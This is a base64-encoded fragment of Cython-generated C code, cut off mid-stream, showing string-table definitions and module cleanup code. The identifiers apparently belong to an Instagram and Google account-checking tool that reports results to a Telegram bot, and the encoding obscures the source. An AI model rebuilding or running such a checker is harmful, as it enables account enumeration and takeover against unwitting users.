X2FjY291bnRzX2dvb2dsZV9jb21fc2lnbmluIF9fcHl4X3N0cmluZ190YWJbMjQ3XVxuI2RlZmluZSBfX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwIF9fcHl4X3N0cmluZ190YWJbMjQ4XVxuI2RlZmluZSBfX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwXzIgX19weXhfc3RyaW5nX3RhYlsyNDldXG4jZGVmaW5lIF9fcHl4X2twX3VfaHR0cHNfYXBpX3RlbGVncmFtX29yZ19ib3QgX19weXhfc3RyaW5nX3RhYlsyNTBdXG4jZGVmaW5lIF9fcHl4X2twX3VfaHR0cHNfaV9pbnN0YWdyYW1fY29tX2FwaV92MV9hY2MgX19weXhfc3RyaW5nX3RhYlsyNTFdXG4jZGVmaW5lIF9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb20gX19weXhfc3RyaW5nX3RhYlsyNTJdXG4jZGVmaW5lIF9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fMiBfX3B5eF9zdHJpbmdfdGFiWzI1M11cbiNkZWZpbmUgX19weXhfa3BfdV9odHRwc193d3dfaW5zdGFncmFtX2NvbV9hcGlfZ3JhcCBfX3B5eF9zdHJpbmdfdGFiWzI1NF1cbiNkZWZpbmUgX19weXhfa3BfdV9odHRwc193d3dfaW5zdGFncmFtX2NvbV9jcmlzdGlhbiBfX3B5eF9zdHJpbmdfdGFiWzI1NV1cbiNkZWZpbmUgX19weXhfbl91X2kgX19weXhfc3RyaW5nX3RhYlsyNTZdXG4jZGVmaW5lIF9fcHl4X2twX3VfaV9pbnN0YWdyYW1fY29tIF9fcHl4X3N0cmluZ190YWJbMjU3XVxuI2RlZmluZSBfX3B5eF9uX3VfaWRzIF9fcHl4X3N0cmluZ190YWJbMjU4XVxuI2RlZmluZSBfX3B5eF9uX3VfaWdfc2lnX2tleV92ZXJzaW9uIF9fcHl4X3N0cmluZ190YWJbMjU5XVxuI2RlZmluZSBfX3B5eF9rcF91X2ltX3JhbWRvb3QgX19weXhfc3RyaW5nX3RhYlsyNjBdXG4jZGVmaW5lIF9fcHl4X25fdV9pbXBvcnRsaWIgX19weXhfc3RyaW5nX3RhYlsyNjFdXG4jZGVmaW5lIF9fcHl4X25fdV9pbXBvcnRsaWJfdXRpbCBfX3B5eF9zdHJpbmdfdGFiWzI2Ml1cbiNkZWZpbmUgX19weXhfbl91X2luZm9pbnN0YSBfX3B5eF9zdHJpbmdfdGFiWzI2M11cbiNkZWZpbmUgX19weXhfbl91X2luaXRpYWxpemluZyBfX3B5eF9zdHJpbmdfdGFiWzI2NF1cbiNkZWZpbmUgX19weXhfbl91X2lucHV0IF9fcHl4X3N0cmluZ190YWJbMjY1XVxuI2RlZmluZSBfX3B5eF9uX3VfaXNQcmFpc2UgX19weXhfc3RyaW5nX3RhYlsyNjZdXG4jZGVmaW5lIF9fcHl4X25fdV9pc19idXNpbmVzcyBfX3B5eF9zdHJpbmdfdGFiWzI2N11cbiNkZWZpbmUgX19weXhfbl91X2lzX2Nvcm91dGluZSBfX3B5eF9zdHJpbmdfdGFiWzI2OF1cbiNkZWZpbmUgX19weXhfbl91X2lzX3ByaXZhdGUgX19weXhfc3RyaW5nX3RhYlsyNjldXG4jZGVmaW5lIF9fcHl4X25fdV9pc192ZXJpZmllZCBfX3B5eF9zdHJpbmdfdGFiWzI3MF1cbiNkZWZpbmUgX19weXhfa3BfdV9pc2VuYWJsZWQgX19weXhfc3RyaW5nX3RhYlsyNzFdXG4jZGVmaW5lIF9fcHl4X25fdV9qb2luIF9fcHl4X3N0cmluZ190YWJbMjcyXVxuI2RlZmluZSBfX3B5eF9uX3VfanEgX19weXhfc3RyaW5nX3RhYlsyNzNdXG4jZGVmaW5lIF9fcHl4X25fdV9qc29uIF9fcHl4X3N0cmluZ190YWJbMjc0XVxuI2RlZmluZSBfX3B5eF9uX3VfayBfX3B5eF9zdHJpbmdfdGFiWzI3NV1cbiNkZWZpbmUgX19weXhfa3BfdV9rZWVwX2FsaXZlIF9fcHl4X3N0cmluZ190YWJbMjc2XVxuI2RlZmluZSBfX3B5eF9uX3VfbHNkIF9fcHl4X3N0cmluZ190YWJbMjc3XVxuI2RlZmluZSBfX3B5eF9uX3VfbSBfX3B5eF9zdHJpbmdfdGFiWzI3OF1cbiNkZWZpbmUgX19weXhfa3BfdV9tX2pxX3B5IF9fcHl4X3N0cmluZ190YWJbMjc5XVxuI2RlZmluZSBfX3B5eF9uX3VfbWFpbiBfX3B5eF9zdHJpbmdfdGFiWzI4MF1cbiNkZWZpbmUgX19weXhfbl91X21kNSBfX3B5eF9zdHJpbmdfdGFiWzI4MV1cbiNkZWZpbmUgX19weXhfbl91X21lZGlhX2NvdW50IF9fcHl4X3N0cmluZ190YWJbMjgyXVxuI2RlZmluZSBfX3B5eF9uX3VfbWV0YSBfX3B5eF9zdHJpbmdfdGFiWzI4M11cbiNkZWZpbmUgX19weXhfa3BfdV9taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCBfX3B5eF9zdHJpbmdfdGFiWzI4NF1cbiNkZWZpbmUgX19weXhfbl91X21vZHVsZSBfX3B5eF9zdHJpbmdfdGFiWzI4NV1cbiNkZWZpbmUgX19weXhfbl91X24xIF9fcHl4X3N0cmluZ190YWJbMjg2XVxuI2RlZmluZSBfX3B5eF9uX3VfbjIgX19weXhfc3RyaW5nX3RhYlsyODddXG4jZGVmaW5lIF9fcHl4X25fdV9uYW1lIF9fcHl4X3N0cmluZ190YWJbMjg4XVxuI2RlZmluZSBfX3B5eF9uX3VfbmFtZV8yIF9fcHl4X3N0cmluZ190YWJbMjg5XVxuI2RlZmluZSBfX3B5eF9uX3VfbmV4dCBfX3B5eF9zdHJpbmdfdGFiWzI5MF1cbiNkZWZpbmUgX19weXhfbl91X250IF9fcHl4X3N0cmluZ190YWJbMjkxXVxuI2RlZmluZSBfX3B5eF9rcF91X251bGwgX19weXhfc3RyaW5nX3RhYlsyOTJdXG4jZGVmaW5lIF9fcHl4X2twX3VfbnVsbF9udWxsX251bGxfbnVsbF9udWxsX05MX251bCBfX3B5eF9zdHJpbmdfdGFiWzI5M11cbiNkZWZpbmUgX19weXhfbl91X28gX19weXhfc3RyaW5nX3RhYlsyOTRdXG4jZGVmaW5lIF9fcHl4X25fdV9vayBfX3B5eF9zdHJpbmdfdGFiWzI5NV1cbiNkZWZpbmUgX19weXhfbl91X29wZW4gX19weXhfc3RyaW5nX3RhYlsyOTZdXG4jZGVmaW5lIF9fcHl4X25fdV9vcmlnaW4gX19weXhfc3RyaW5nX3RhYlsyOTddXG4jZGVmaW5lIF9fcHl4X25fdV9vcyBfX3B5eF9zdHJpbmdfdGFiWzI5OF1cbiNkZWZpbmUgX19weXhfbl91X291dHB1dCBfX3B5eF9zdHJpbmdfdGFiWzI5OV1cbiNkZWZpbmUgX19weXhfbl91X3BhcmFtcyBfX3B5eF9zdHJpbmdfdGFiWzMwMF1cbiNkZWZpbmUgX19weXhfa3BfdV9waXBfaW5zdGFsbF9iczQgX19weXhfc3RyaW5nX3RhYlszMDFdXG4jZGVmaW5lIF9fcHl4X2twX3VfcGlwX2luc3RhbGxfY29sb3JhbWEgX19weXhfc3RyaW5nX3RhYlszMDJdXG4jZGVmaW5lIF9fcHl4X2twX3VfcGlwX2luc3RhbGxfaGFzaGxpYiBfX3B5eF9zdHJpbmdfdGFiWzMwM11cbiNkZWZpbmUgX19weXhfa3BfdV9waXBfaW5zdGFsbF9qc29uIF9fcHl4X3N0cmluZ190YWJbMzA0XVxuI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX3B5dGhvbl9jZm9udHMgX19weXhfc3RyaW5nX3RhYlszMDVdXG4jZGVmaW5lIF9fcHl4X2twX3VfcGlwX2luc3RhbGxfcmFuZG9tIF9fcHl4X3N0cmluZ190YWJbMzA2XVxuI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX3JlIF9fcHl4X3N0cmluZ190YWJbMzA3XVxuI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX3JlcXVlc3RzIF9fcHl4X3N0cmluZ190YWJbMzA4XVxuI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX3JpY2ggX19weXhfc3RyaW5nX3RhYlszMDldXG4jZGVmaW5lIF9fcHl4X2twX3VfcGlwX2luc3RhbGxfdGhyZWFkaW5nIF9fcHl4X3N0cmluZ190YWJbMzEwXVxuI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX3RpbWUgX19weXhfc3RyaW5nX3RhYlszMTFdXG4jZGVmaW5lIF9fcHl4X2twX3VfcGlwX2luc3RhbGxfdXNlcl9hZ2VudCBfX3B5eF9zdHJpbmdfdGFiWzMxMl1cbiNkZWZpbmUgX19weXhfa3BfdV9waXBfaW5zdGFsbF91dWlkIF9fcHl4X3N0cmluZ190YWJbMzEzXVxuI2RlZmluZSBfX3B5eF9uX3VfcGsgX19weXhfc3RyaW5nX3RhYlszMTRdXG4jZGVmaW5lIF9fcHl4X25fdV9wb3AgX19weXhfc3RyaW5nX3RhYlszMTVdXG4jZGVmaW5lIF9fcHl4X25fdV9wb3N0IF9fcHl4X3N0cmluZ190YWJbMzE2XVxuI2RlZmluZSBfX3B5eF9uX3VfcHAgX19weXhfc3RyaW5nX3RhYlszMTddXG4jZGVmaW5lIF9fcHl4X25fdV9wcHBwIF9fcHl4X3N0cmluZ190YWJbMzE4XVxuI2RlZmluZSBfX3B5eF9uX3VfcHJpbnQgX19weXhfc3RyaW5nX3RhYlszMTldXG4jZGVmaW5lIF9fcHl4X25fdV9wcmludGluZyBfX3B5eF9zdHJpbmdfdGFiWzMyMF1cbiNkZWZpbmUgX19weXhfbl91X3ByaW9yaXR5IF9fcHl4X3N0cmluZ190YWJbMzIxXVxuI2RlZmluZSBfX3B5eF9rcF91X3Fjb21fZW5fVVNfNTQ1OTg2IF9fcHl4X3N0cmluZ190YWJbMzIyXVxuI2RlZmluZSBfX3B5eF9uX3VfcXVhbG5hbWUgX19weXhfc3RyaW5nX3RhYlszMjNdXG4jZGVmaW5lIF9fcHl4X25fdV9xdWVyeSBfX3B5eF9zdHJpbmdfdGFiWzMyNF1cbiNkZWZpbmUgX19weXhfbl91X3IgX19weXhfc3RyaW5nX3RhYlszMjVdXG4jZGVmaW5lIF9fcHl4X25fdV9yYW5kX2lkcyBfX3B5eF9zdHJpbmdfdGFiWzMyNl1cbiNkZWZpbmUgX19weXhfbl91X3JhbmRpbnQgX19weXhfc3RyaW5nX3RhYlszMjddXG4jZGVmaW5lIF9fcHl4X25fdV9yYW5kb20gX19weXhfc3RyaW5nX3RhYlszMjhdXG4jZGVmaW5lIF9fcHl4X25fdV9yYW5kcmFuZ2UgX19weXhfc3RyaW5nX3RhYlszMjldXG4jZGVmaW5lIF9fcHl4X25fdV9yYW5nZSBfX3B5eF9zdHJpbmdfdGFiWzMzMF1cbiNkZWZpbmUgX19weXhfbl91X3JlIF9fcHl4X3N0cmluZ190YWJbMzMxXVxuI2RlZmluZSBfX3B5eF9uX3VfcmVhZCBfX3B5eF9zdHJpbmdfdGFiWzMzMl1cbiNkZWZpbmUgX19weXhfbl91X3JlZmVyZXIgX19weXhfc3RyaW5nX3RhYlszMzNdXG4jZGVmaW5lIF9fcHl4X25fdV9yZW5kZXIgX19weXhfc3RyaW5nX3RhYlszMzRdXG4jZGVmaW5lIF9fcHl4X25fdV9yZXF1ZXN0cyBfX3B5eF9zdHJpbmdfdGFiWzMzNV1cbiNkZWZpbmUgX19weXhfbl91X3JlczEgX19weXhfc3RyaW5nX3RhYlszMzZdXG4jZGVmaW5lIF9fcHl4X25fdV9yZXNwb25zZSBfX3B5eF9zdHJpbmdfdGFiWzMzN11cbiNkZWZpbmUgX19weXhfbl91X3Jlc3QgX19weXhfc3RyaW5nX3RhYlszMzhdXG4jZGVmaW5lIF9fcHl4X25fdV9yaWNoX2NvbnNvbGUgX19weXhfc3RyaW5nX3RhYlszMzldXG4jZGVmaW5lIF9fcHl4X25fdV9yaWNoX3BhbmVsIF9fcHl4X3N0cmluZ190YWJbMzQwXVxuI2RlZmluZSBfX3B5eF9uX3Vfcm5kIF9fcHl4X3N0cmluZ190YWJbMzQxXVxuI2RlZmluZSBfX3B5eF9uX3VfcnIgX19weXhfc3RyaW5nX3RhYlszNDJdXG4jZGVmaW5lIF9fcHl4X25fdV9zZWFyY2ggX19weXhfc3RyaW5nX3RhYlszNDNdXG4jZGVmaW5lIF9fcHl4X25fdV9zZW5kIF9fcHl4X3N0cmluZ190YWJbMzQ0XVxuI2RlZmluZSBfX3B5eF9rcF91X3NlbmRNZXNzYWdlX2NoYXRfaWQgX19weXhfc3RyaW5nX3RhYlszNDVdXG4jZGVmaW5lIF9fcHl4X25fdV9zZXJ2ZXJfdGltZXN0YW1wcyBfX3B5eF9zdHJpbmdfdGFiWzM0Nl1cbiNkZWZpbmUgX19weXhfbl91X3NldF9uYW1lIF9fcHl4X3N0cmluZ190YWJbMzQ3XVxuI2RlZmluZSBfX3B5eF9uX3Vfc2lnbmVkX2JvZHkgX19weXhfc3RyaW5nX3RhYlszNDhdXG4jZGVmaW5lIF9fcHl4X25fdV9zcGVjIF9fcHl4X3N0cmluZ190YWJbMzQ5XVxuI2RlZmluZSBfX3B5eF9uX3Vfc3BsaXQgX19weXhfc3RyaW5nX3RhYlszNTBdXG4jZGVmaW5lIF9fcHl4X25fdV9zcGxpdGxpbmVzIF9fcHl4X3N0cmluZ190YWJbMzUxXVxuI2RlZmluZSBfX3B5eF9uX3Vfc3MgX19weXhfc3RyaW5nX3RhYlszNTJdXG4jZGVmaW5lIF9fcHl4X25fdV9zdGFydCBfX3B5eF9zdHJpbmdfdGFiWzM1M11cbiNkZWZpbmUgX19weXhfbl91X3N0ZG91dCBfX3B5eF9zdHJpbmdfdGFiWzM1NF1cbiNkZWZpbmUgX19weXhfbl91X3N1YnByb2Nlc3MgX19weXhfc3RyaW5nX3RhYlszNTVdXG4jZGVmaW5lIF9fcHl4X25fdV9zeXMgX19weXhfc3RyaW5nX3RhYlszNTZdXG4jZGVmaW5lIF9fcHl4X25fdV9zeXN0ZW0gX19weXhfc3RyaW5nX3RhYlszNTddXG4jZGVmaW5lIF9fcHl4X25fdV90IF9fcHl4X3N0cmluZ190YWJbMzU4XVxuI2RlZmluZSBfX3B5eF9uX3VfdGFyZ2V0IF9fcHl4X3N0cmluZ190YWJbMzU5XVxuI2RlZmluZSBfX3B5eF9uX3VfdGVzdCBfX3B5eF9zdHJpbmdfdGFiWzM2MF1cbiNkZWZpbmUgX19weXhfbl91X3RleHQgX19weXhfc3RyaW5nX3RhYlszNjFdXG4jZGVmaW5lIF9fcHl4X2twX3VfdGV4dF8yIF9fcHl4X3N0cmluZ190YWJbMzYyXVxuI2RlZmluZSBfX3B5eF9uX3VfdGhyZWFkaW5nIF9fcHl4X3N0cmluZ190YWJbMzYzXVxuI2RlZmluZSBfX3B5eF9uX3VfdGhyZWFkcyBfX3B5eF9zdHJpbmdfdGFiWzM2NF1cbiNkZWZpbmUgX19weXhfbl91X3Rocm93IF9fcHl4X3N0cmluZ190YWJbMzY1XVxuI2RlZmluZSBfX3B5eF9uX3VfdGltZSBfX3B5eF9zdHJpbmdfdGFiWzM2Nl1cbiNkZWZpbmUgX19weXhfbl91X3RsIF9fcHl4X3N0cmluZ190YWJbMzY3XVxuI2RlZmluZSBfX3B5eF9rcF91X3RsX3R4dCBfX3B5eF9zdHJpbmdfdGFiWzM2OF1cbiNkZWZpbmUgX19weXhfbl91X3RsbCBfX3B5eF9zdHJpbmdfdGFiWzM2OV1cbiNkZWZpbmUgX19weXhfbl91X3RsbF9sb2NhbHNfZ2VuZXhwciBfX3B5eF9zdHJpbmdfdGFiWzM3MF1cbiNkZWZpbmUgX19weXhfbl91X3RvayBfX3B5eF9zdHJpbmdfdGFiWzM3MV1cbiNkZWZpbmUgX19weXhfbl91X3RvdGFsIF9fcHl4X3N0cmluZ190YWJbMzcyXVxuI2RlZmluZSBfX3B5eF9uX3VfdHJ1ZSBfX3B5eF9zdHJpbmdfdGFiWzM3M11cbiNkZWZpbmUgX19weXhfa3BfdV91XzFfaSBfX3B5eF9zdHJpbmdfdGFiWzM3NF1cbiNkZWZpbmUgX19weXhfbl91X3VhIF9fcHl4X3N0cmluZ190YWJbMzc1XVxuI2RlZmluZSBfX3B5eF9uX3VfdWlkIF9fcHl4X3N0cmluZ190YWJbMzc2XVxuI2RlZmluZSBfX3B5eF9uX3VfdXNlciBfX3B5eF9zdHJpbmdfdGFiWzM3N11cbiNkZWZpbmUgX19weXhfa3BfdV91c2VySUQgX19weXhfc3RyaW5nX3RhYlszNzhdXG4jZGVmaW5lIF9fcHl4X2twX3VfdXNlcl9hZ2VudCBfX3B5eF9zdHJpbmdfdGFiWzM3OV1cbiNkZWZpbmUgX19weXhfbl91X3VzZXJfYWdlbnRfMiBfX3B5eF9zdHJpbmdfdGFiWzM4MF1cbiNkZWZpbmUgX19weXhfbl91X3VzZXJuYW1lIF9fcHl4X3N0cmluZ190YWJbMzgxXVxuI2RlZmluZSBfX3B5eF9rcF91X3VzZXJuYW1lX2NyaXN0aWFubyBfX3B5eF9zdHJpbmdfdGFiWzM4Ml1cbiNkZWZpbmUgX19weXhfa3BfdV91dGZfOCBfX3B5eF9zdHJpbmdfdGFiWzM4M11cbiNkZWZpbmUgX19weXhfbl91X3V0aWwgX19weXhfc3RyaW5nX3RhYlszODRdXG4jZGVmaW5lIF9fcHl4X25fdV91dWkgX19weXhfc3RyaW5nX3RhYlszODVdXG4jZGVmaW5lIF9fcHl4X25fdV91dWlkIF9fcHl4X3N0cmluZ190YWJbMzg2XVxuI2RlZmluZSBfX3B5eF9uX3VfdXVpZDQgX19weXhfc3RyaW5nX3RhYlszODddXG4jZGVmaW5lIF9fcHl4X25fdV91dXUgX19weXhfc3RyaW5nX3RhYlszODhdXG4jZGVmaW5lIF9fcHl4X25fdV91dXVfbG9jYWxzX2dlbmV4cHIgX19weXhfc3RyaW5nX3RhYlszODldXG4jZGVmaW5lIF9fcHl4X25fdV92YWx1ZSBfX3B5eF9zdHJpbmdfdGFiWzM5MF1cbiNkZWZpbmUgX19weXhfbl91X3ZhcmlhYmxlcyBfX3B5eF9zdHJpbmdfdGFiWzM5MV1cbiNkZWZpbmUgX19weXhfbl91X3cgX19weXhfc3RyaW5nX3RhYlszOTJdXG4jZGVmaW5lIF9fcHl4X25fdV93ZWJicm93c2VyIF9fcHl4X3N0cmluZ190YWJbMzkzXVxuI2RlZmluZSBfX3B5eF9uX3Vfd3JpdGUgX19weXhfc3RyaW5nX3RhYlszOTRdXG4jZGVmaW5lIF9fcHl4X25fdV94IF9fcHl4X3N0cmluZ190YWJbMzk1XVxuI2RlZmluZSBfX3B5eF9rcF91X3hfZmJfZnJpZW5kbHlfbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzM5Nl1cbiNkZWZpbmUgX19weXhfa3BfdV94X2ZiX2xzZCBfX3B5eF9zdHJpbmdfdGFiWzM5N11cbiNkZWZpbmUgX19weXhfbl91X3llbGxvdyBfX3B5eF9zdHJpbmdfdGFiWzM5OF1cbiNkZWZpbmUgX19weXhfbl91X3l5IF9fcHl4X3N0cmluZ190YWJbMzk5XVxuXG4jaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19weXhfbV9jbGVhcihQeU9iamVjdCAqbSkge1xuICBfX3B5eF9tc3RhdGV0eXBlICpjbGVhcl9tb2R1bGVfc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtKTtcbiAgaWYgKCFjbGVhcl9tb2R1bGVfc3RhdGUpIHJldHVybiAwO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2QpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2IpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUpO1xuICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VEXG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUpO1xuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRFxuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X0Z1c2VkRnVuY3Rpb25UeXBlKTtcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKE5VTEwpO1xuICAjZW5kaWZcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8yanFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpO1xuICBmb3IgKGludCBpPTA7IGk8MTsgKytpKSB7IFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfc2xpY2VbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTwyNDsgKytpKSB7IFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHVwbGVbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTwxNTsgKytpKSB7IFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfY29kZW9ial90YWJbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTw0MDA7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3N0cmluZ190YWJbaV0pOyB9XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF81KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzExKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTUpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTAwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTExKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTUwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjA4KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOTk5KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTAwMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEzMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDAwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTEpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEyKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxMyk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTQpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE1KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxNik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTcpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE4KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxOSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwMDAwMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDEpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDEpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDEpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTkwMDAwMDAwMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzI1MDAwMDAwMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zNzEzNjY4Nzg2KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNTY5OTc4NTIxNyk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF